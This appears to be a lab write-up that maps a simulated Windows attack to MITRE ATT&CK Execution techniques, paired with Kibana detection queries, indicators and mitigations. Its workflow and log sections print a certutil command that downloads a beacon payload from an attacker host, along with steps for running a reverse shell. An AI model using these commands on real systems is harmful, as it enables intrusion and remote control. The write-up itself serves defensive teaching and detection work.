# TA0002 – Execution (MITRE ATT&CK)

## Tactic

**TA0002 – Execution**

### Objective

The objective of the Execution tactic is to run attacker-controlled code on a local or remote system after gaining access. In this laboratory simulation, the attacker executed multiple malicious binaries using the Windows Command Shell, including `shell.exe`, `certutil.exe`, and `beacon.exe`, resulting in remote code execution and command-and-control communication.

---

# MITRE ATT&CK Technique Mapping

| ATT&CK ID | Technique | Description |
|------------|----------------------------------------------|--------------------------------------------|
| **T1059.003** | Windows Command Shell | `cmd.exe` used to execute malicious binaries |
| **T1204.002** | User Execution – Malicious File | Manual execution of `shell.exe` and `beacon.exe` |
| **T1059.001** | PowerShell *(Optional)* | Alternative execution method using PowerShell |
| **T1218** | System Binary Proxy Execution | `certutil.exe` abused to download payloads |

---

# Attack Description

After obtaining access to the target workstation, the attacker used the Windows Command Prompt (`cmd.exe`) to execute malicious programs stored on disk. The reverse shell payload (`shell.exe`) established an initial connection to the attacker's system, while `certutil.exe` downloaded an additional payload (`beacon.exe`) that later initiated HTTP-based command-and-control communications.

The execution phase demonstrates how legitimate Windows utilities and user-launched binaries can be abused to run malicious code.

---

# Attack Simulation Workflow

1. Store the payload in:

```
C:\Users\Public\shell.exe
```

2. Execute the payload using Command Prompt:

```cmd
C:\Users\Public\shell.exe
```

3. Obtain a reverse shell connection.

4. On the Domain Controller, use `certutil.exe` to download an additional payload:

```cmd
certutil -urlcache -split -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe
```

5. Execute the downloaded beacon:

```cmd
C:\Users\Public\beacon.exe
```

6. The beacon establishes outbound HTTP communication with the attacker.

---

# Technique 1 – Windows Command Shell (T1059.003)

The Windows Command Shell (`cmd.exe`) was used to launch attacker-controlled executables throughout the simulation.

## Activities Performed

- Executed `shell.exe` on WS1.
- Executed `certutil.exe` to download `beacon.exe`.
- Executed `beacon.exe` on the Domain Controller.

---

# Detection Opportunities – Windows Command Shell

| Data Source | Detection Logic | Indicator |
|-------------|----------------|-----------|
| Event ID 4688 | `cmd.exe` spawning suspicious child processes | `cmd.exe → shell.exe` |
| Event ID 4688 | `cmd.exe → beacon.exe` | Non-standard executable |
| Event ID 4688 | `cmd.exe → certutil.exe` | LOLBin execution |
| Command Line Logging | Detect `/c` launching executables | `cmd.exe /c C:\Users\Public\shell.exe` |
| Sysmon Event 3 | Outbound traffic from spawned processes | Ports `4444` and `8081` |

---

# Example Kibana KQL Queries

## Detect shell.exe execution

```kql
event.code:4688 and process.name:"shell.exe"
```

## Detect beacon.exe execution

```kql
event.code:4688 and process.name:"beacon.exe"
```

## Detect cmd.exe spawning executables from Public folder

```kql
event.code:4688 and process.name:"cmd.exe" and process.command_line:*C:\\Users\\Public\\*
```

## Detect certutil downloads

```kql
event.code:4688 and process.name:"certutil.exe" and process.command_line:*urlcache*
```

---

# Technique 2 – User Execution (T1204.002)

The attacker manually executed malicious files after placing them on disk. Although the simulation assumes direct local access, this behavior is representative of users opening malicious email attachments, downloaded executables, or files delivered through removable media.

## Activities Performed

- Executed `shell.exe` from `C:\Users\Public`.
- Executed `beacon.exe` after downloading it with `certutil.exe`.

---

# Detection Opportunities – User Execution

| Data Source | Detection Logic | Indicator |
|-------------|----------------|-----------|
| Sysmon Event 11 | Executable created in unusual location | `C:\Users\Public\shell.exe` |
| Event ID 4688 | Execution from Public folder | `C:\Users\Public\shell.exe` |
| File Monitoring | New executable in writable directories | `.exe` under `Public` |
| Sysmon Event 3 | Immediate outbound network connection | Reverse shell traffic |

---

# MITRE ATT&CK Mapping Summary

| Field | Value |
|---------|----------------------------------------------|
| **Tactic** | Execution (TA0002) |
| **Primary Technique** | T1059.003 – Windows Command Shell |
| **Supporting Technique** | T1204.002 – User Execution |
| **Optional Technique** | T1059.001 – PowerShell |
| **Platforms** | Windows |
| **Permissions Required** | User (initial), Administrator/SYSTEM (later stages) |
| **Primary Data Sources** | Process Creation, Command Line, File Monitoring, Network Connections |
| **Detection Difficulty** | Moderate to High |

---

# Kibana Evidence

## Event ID 4688 – shell.exe

```
Process Name:
C:\Users\Public\shell.exe

Parent Process:
C:\Windows\System32\cmd.exe
```

---

## Event ID 4688 – certutil.exe

```
Process Name:
C:\Windows\System32\certutil.exe

Command Line:
certutil -urlcache -split -f http://192.168.1.5:8080/beacon.exe
```

---

## Event ID 4688 – beacon.exe

```
Process Name:
C:\Users\Public\beacon.exe

Parent Process:
cmd.exe
```

---

## Sysmon Event ID 3

```
shell.exe  → 192.168.1.5:4444

beacon.exe → 192.168.1.5:8081
```

---

# Correlated Execution Events

| Event | Host | Detection Rule |
|---------|------|-----------------------------------------------|
| `shell.exe` executed | WS1 | `process.name:"shell.exe"` |
| `certutil.exe` executed | DC | `process.name:"certutil.exe"` |
| `beacon.exe` executed | DC | `process.name:"beacon.exe"` |
| `cmd.exe` spawning unknown executable | WS1/DC | Parent-child anomaly detection |
| Reverse shell established | WS1 | Sysmon Event 3 to port `4444` |
| HTTP beacon initiated | DC | Sysmon Event 3 to port `8081` |

---

# Indicators of Compromise (IOCs)

| Indicator Type | Value |
|----------------|---------------------------------------|
| Executable | `shell.exe` |
| Executable | `beacon.exe` |
| LOLBin | `certutil.exe` |
| Directory | `C:\Users\Public` |
| Parent Process | `cmd.exe` |
| Reverse Shell Port | `4444` |
| Beacon Port | `8081` |

---

# Mitigation and Prevention

- Implement Windows Defender Application Control (WDAC) or AppLocker policies to block execution from `C:\Users\Public` and other user-writable directories.
- Enable detailed process creation auditing (Event ID 4688) with full command-line logging.
- Monitor for unusual parent-child relationships involving `cmd.exe`, `powershell.exe`, and LOLBins such as `certutil.exe`.
- Restrict the use of system utilities commonly abused for payload delivery and execution.
- Deploy Endpoint Detection and Response (EDR) solutions capable of detecting suspicious process behavior and terminating malicious binaries automatically.
- Continuously monitor outbound network connections for newly created processes initiating communication with external hosts.

---

# Key Takeaways

The execution phase demonstrates how attackers can abuse trusted Windows components and manually executed binaries to run malicious code. Monitoring process creation events, command-line arguments, parent-child relationships, and network activity provides defenders with multiple opportunities to detect and stop malicious execution before additional attack stages occur.

---

# References

- MITRE ATT&CK – TA0002: Execution
- MITRE ATT&CK – T1059.003: Windows Command Shell
- MITRE ATT&CK – T1204.002: User Execution (Malicious File)
- MITRE ATT&CK – T1218: System Binary Proxy Execution
- Lab Simulation: Reverse Shell Execution and HTTP Beacon Deployment